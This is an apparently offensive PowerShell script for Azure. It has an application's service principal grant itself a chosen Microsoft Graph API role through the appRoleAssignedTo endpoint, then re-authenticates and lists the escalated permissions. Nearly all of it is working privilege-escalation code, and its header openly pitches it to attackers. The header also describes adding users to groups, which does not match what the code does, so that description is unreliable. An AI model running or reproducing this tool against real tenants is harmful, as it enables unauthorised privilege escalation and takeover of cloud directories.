<#
    .SYNOPSIS
    <Add-AzUserToGroup is a powerful PowerShell module that allows administrators to easily adding a user account on Azure group using the Graph API. This module is particularly useful for attackers looking to automate their user management processes and increase their efficiency on the Azure platform.>
    .DESCRIPTION
    <Module that utilizes the Graph API to streamline the process of adding a user accounts on the Azure groups.>
    .INPUTS
    <Inputs if any, otherwise state None>
    .OUTPUTS
    <Creates a user on Azure AD.>
    .NOTES
    Version:        1.0
    Author:         Elbert Santos aka tuxtrack
    Creation Date:  01 May 2023
    Purpose/Change: Initial script development
#>
function Add-GraphAPIRole {

  Clear-Host

  Write-Host @("
    @@@@@@@@@@@@#G55PG#@@@@@@@@@@@@@@@@
    @@@@@@@@@#J!~^^^^^~!J#@@@@@@@@@@@@@
    @@@@@@@@Y~~~~!!!!!~~~~5@@@@@@@@@@@@
    @@@@@@@B~!!!!!!!!!!!!!~#@@@@@@@@@@@
    @@@@@@@G!7777777777777!B@@@@@@@@@@@
    @@@@@@@@J7???????????7Y@@@@@@@@@@@@
    @@@@@@@@@GJJJJJJJJJJYB@@@@@@@@@@@@@
    @@@@@@@@#P?^^!777!^~JB&@@@@@@@@@@@@") -ForegroundColor Cyan -NoNewline
  Write-Host "    [*] Add Graph API Role to this Application [*]" -ForegroundColor Yellow -NoNewline
  Write-Host @(" 
    @@@@@#J~^^~^       ^~^~75J^~JB@@@@@
    @@@&J~~~~~~!~     ~~^:........:~5&@
    @@&7~!!!!!!!!^   ~!!:::.......::^7@
    @@?!7777777777: ^77!^^^^::.:~!777?@
    @G7777777777777!7777^^:::..^^~!!!?@
    @J7????????????????7^......^::::~Y@
    @#5YYYYYYYYYYYYYYYYYYJ7~^..:^!Y#@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@&5G&@@@@@@
 ") -ForegroundColor Cyan

  $roleId = Read-Host "[+] Please insert the Graph API Role ID"
  $serviceprincipalId = Get-AzADServicePrincipal -ApplicationId $azureApplicationID | select-object -ExpandProperty id

  $resourceEndpoint = "/servicePrincipals/$($serviceprincipalId)/appRoleAssignments?`$select=appRoleId,resourceId"
  Try {
    $resourceResult = (Invoke-RestMethod -Uri ($msGraphEndpoint + $resourceEndpoint) -Headers $HttpAuthHeader -Method Get).value
  }
  Catch {
    Write-Error $Error[0]
  }

  if ($resourceResult.appRoleId -contains $roleId) {
    Write-Host "[+] Please insert another Role ID. This one is already on the API Roles." -ForegroundColor Cyan
    Exit
  }

  $body = @{
    principalId = $serviceprincipalId
    resourceId  = $resourceResult.resourceid[0] 
    appRoleId   = $roleId   
  }

  $appName = (Parse-JWTtoken $msGraphToken).app_displayname

  Write-Host "[+] Assigning the new role to $($appName)" -ForegroundColor Blue
  $appRoleAssignedToEndpoint = "/servicePrincipals/$($servicePrincipalId)/appRoleAssignedTo"
  try {
      (Invoke-RestMethod -Uri ($msGraphEndpoint + $appRoleAssignedToEndpoint) -Headers $HttpAuthHeader -Method POST -Body $($body | ConvertTo-Json) -ContentType 'application/json') | Out-Null
  }
  catch { 
    $statusCode = $_.Exception.Response.StatusCode.value__ 
    Write-Warning $Error[0]
  }

  if ($statusCode -eq '400') {
    Write-Host " [+] Role not found!" -ForegroundColor Yellow
    Write-Host " [+] Please insert a valid role ID." -ForegroundColor Yellow
    sleep 5
    $reDo = Read-Host "[+] Type Yes insert a new role ID or press Enter/Return to exit to main menu."
    if ($reDo -eq 'Yes') {
      Add-GraphAPIRole
    }
    else {
      Clear-Host
      Menu
    }
  }

  for ($i = 1; $i -le 100; $i++ ) {
    Write-Progress -Activity " [+] Wait 20 seconds" -Status " $i% Complete:" -PercentComplete $i
    Start-Sleep -Milliseconds 200
  }

  Disconnect-AzAccount | Out-Null
    
  Connect-AzAccount -Credential $psCred -TenantID $azureTenantID -ServicePrincipal -WarningAction Ignore -ErrorAction Ignore | Out-Null
  $msGraphToken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
  $RoleList = (Parse-JWTtoken $msGraphToken).roles
  Write-Host "[+] The new roles are:" -ForegroundColor Cyan
  for ($i = 0; $i -lt $RoleList.Length; $i++) {
    Write-Host "    [*]" $RoleList[$i] -ForegroundColor Magenta
  } 
  Write-Host "  [+] Enjoy the new role :)" -ForegroundColor Cyan 
  $main = Read-Host "[+] Press any key to main menu"
  if ($main -eq '') { Menu }
}
Add-GraphAPIRole